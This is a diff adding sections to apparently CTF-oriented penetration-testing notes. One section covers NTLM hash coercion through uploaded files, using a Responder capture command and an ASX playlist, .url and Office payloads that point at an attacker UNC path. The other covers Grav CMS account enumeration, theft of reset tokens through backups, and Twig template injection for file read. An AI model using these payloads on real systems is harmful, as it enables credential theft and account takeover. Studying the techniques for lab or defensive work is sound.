@@ -233,6 +233,28 @@ magic bytes. Bypasses: `.phtml`, `.php5`, `.phar`, double extension,
 `.htaccess` upload, null byte on old stacks, valid image header + PHP tail.
 Then find where the file landed (fuzz `/uploads/`, `/images/`, the response).
 
+**An upload that a person/bot then *opens* is a client-side NTLM coercion, not
+a code-exec bug — the file never has to run.** When the app says a human or an
+automated "reviewer" will *view/open/convert* your upload (an HR review, a
+thumbnailer, a "we'll get back to you"), and especially when it names a Windows
+client — "compatible with Windows Media Player", "opens in Office", a PDF/preview
+handler — the win is to make that client authenticate to you. Supply a file
+whose format resolves an external reference over SMB and start a capture
+(`responder -I tun0 -v`), then crack the NetNTLMv2 and reuse it (SSH/WinRM/RDP,
+or relay). Formats that coerce on open, by handler:
+- **Windows Media Player**: an `.asx`/`.wax`/`.wvx` playlist with
+  `<asx version="3.0"><entry><ref href="file://\\<tun0>\s\x.wmv"/></entry></asx>`
+  — WMP resolves the `<ref>` UNC and authenticates. (This paid on a box whose
+  upload said "compatible with Windows Media Player".)
+- **Explorer/preview/generic**: `.lnk`, `.url` (`URL=file://<ip>/x` or
+  `IconFile=\\<ip>\x`), `.scf`, `.library-ms`, `.searchConnector-ms`; Office docs
+  with a remote template/`INCLUDEPICTURE \\<ip>\x`.
+The reviewer usually fires within ~1 min; if the callback's username is a
+service or a human account, that account is the foothold. Egress note: this
+needs the target to reach *you* on 445 — cheap to confirm, and it is the whole
+point when outbound is otherwise filtered. Class: any "upload → someone opens it"
+feature is a coercion surface; pick the payload format from the opening handler.
+
 **Attacker-controlled `.htaccess`** — when you can write a served directory (an
 upload sink, a user-home hoster, `mod_userdir`), the `.htaccess` itself is the
 payload, and what it grants is set by `AllowOverride`. Probe the grant first:
@@ -622,6 +644,38 @@ Framework note: a Rails `_*_session` cookie that decrypts (with a leaked
 plain `auth_token` cookie bound to client IP (`<db-auth_token>&M&<ip>`), replayable
 straight from the DB you just read. It authenticates GETs, but Rails CSRF still
 blocks POST/DELETE without a full session.
+
+## A CMS's own deny rules and features leak what you need (Grav class)
+
+Flat-file CMSs guard their internals with web-server rules and helpful admin
+tools; both leak. Three transferable moves, with Grav as the worked example:
+
+- **The stock deny config is an unauthenticated file-existence oracle.** Grav's
+  `.htaccess` only routes *non-existent* paths into `index.php`
+  (`RewriteCond %{REQUEST_FILENAME} !-f`), then blanket-denies real files under
+  `bin|cache|logs|backup|user/*.yaml|…`. So **403 (server error page) = the file
+  exists**, **404 (the CMS's themed 404) = it does not** — distinguish by size,
+  not code alone. Fuzz `user/accounts/FUZZ.yaml` to enumerate accounts and
+  `user/plugins/*/blueprints.yaml` to list plugins, with no credential. Any CMS
+  whose "denied" and "missing" responses differ has this oracle.
+- **A backup/export tool is an arbitrary *read*, and often a token exfil.** A
+  low-privileged admin who can only reach "Backups" can still trigger a full-site
+  archive whose default root includes `user/accounts/*.yaml` — every password
+  hash **and** the plaintext password-reset token field. Then abuse the reset
+  flow as a loop: POST forgot-password (writes a fresh `reset:` token into the
+  account YAML) → run a backup → read the token → POST reset → set the password.
+  Account takeover of a *higher*-privileged CMS user without cracking a hash.
+  Generalises to any export feature that bundles credential/token stores.
+- **Pin the exact version and treat "undefined function" leniency as RCE.** Grav
+  ≤1.7.4x with `system.twig.undefined_functions: true` maps unknown Twig
+  functions to PHP functions through an *incomplete* denylist
+  (`Utils::isDangerousFunction` omits the `file_*`/`scandir` family), so a page
+  authored by any Pages-capable account with `process.twig` on runs
+  `read_file()`, `scandir()`, `base64_decode()` as the web user — arbitrary read
+  and a stepping stone to exec. Version-pin a headerless CMS by md5-bisecting its
+  served static assets (bundled jQuery, admin theme CSS/JS) against upstream git
+  tags. Keep the box-specific payload in `local.md`; the method — deny-rule
+  oracle, export-as-read, undefined-function SSTI — is the reusable part.
 
 **A canonicalisation check wired to the wrong operation is no guard.** Code like
 `if (path.normalize(p) == p) { … }` reads as a traversal guard, but check *which*
